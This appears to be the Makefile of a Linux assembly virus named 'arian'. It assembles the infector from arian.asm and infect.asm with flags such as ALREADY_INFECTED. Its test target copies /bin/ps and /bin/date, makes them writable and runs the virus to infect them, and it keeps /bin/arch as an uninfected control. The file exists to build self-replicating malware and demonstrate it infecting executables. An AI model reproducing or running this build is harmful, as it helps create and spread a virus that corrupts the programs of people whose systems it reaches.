# By using this file, you agree to the terms and conditions set
# forth in the COPYING file which can be found at the top level
# of this distribution.
#
#------------------------------------------------------------------------------
LINUX	= `uname -r|sed 's/^\([0-9]\)\.\([0-9]\).*/\1\2/'`
AFLAGS	= -O2 -Iinc/ -DARI -DBE_PARANOID -DZERO_FREE_SPACE -DALREADY_INFECTED \
	-DDEBUG

all: arian

arian: arian.asm infect.asm Makefile
	nasm -f elf $(AFLAGS) $< -o arian.o -DLINUX=$(LINUX)
	ld arian.o -o arian
	@strings arian|grep '\*\*\*'

test: arian
	-@cp -f /bin/ps .
	-@cp -f /bin/arch .	# this should not be infected
	-@chmod +w ps
	-./arian
	-./ps
	-@cp -f /bin/date .
	-@chmod +w date
	-./ps
	-./date

clean:
	-@rm -f arian arian.o ps date arch

.PHONY: all clean test
